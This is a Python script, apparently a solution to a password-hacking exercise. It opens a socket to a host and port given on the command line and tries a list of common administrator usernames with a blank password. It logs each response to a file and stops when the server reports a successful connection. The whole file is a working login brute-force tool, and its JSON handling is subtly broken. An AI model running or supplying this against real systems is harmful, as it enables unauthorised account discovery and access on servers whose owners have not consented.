import socket
import json
import sys

abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

logins_list = [
    'admin', 'Admin', 'admin1', 'admin2', 'admin3',
    'user1', 'user2', 'root', 'default', 'new_user',
    'some_user', 'new_admin', 'administrator',
    'Administrator', 'superuser', 'super', 'su', 'alex',
    'suser', 'rootuser', 'adminadmin', 'useruser',
    'superadmin', 'username', 'username1'
]


def login_generator():
    for login in logins_list:
        yield login


with socket.socket() as ssocket:

    args = sys.argv                             # list of command line arguments
    address_and_port = (args[1], int(args[2]))
    ssocket.connect(address_and_port)
    srecv = ""

    for login_gen in login_generator():
        json_message = "{ 'login' : '" + login_gen + "', 'password' : ' ' }"

        try:
            ssocket.send(json.dumps(json_message).encode('utf8'))
            srecv = ssocket.recv(1024).decode('utf8')

        except:
            print(json_message)
            exit()
        o = open("from_open.txt", "a")
        o.write(json_message + "..." + srecv + "\n")
        o.close()

        if srecv == '{    "result": "Connection success!"}':
            break

print(json_message)
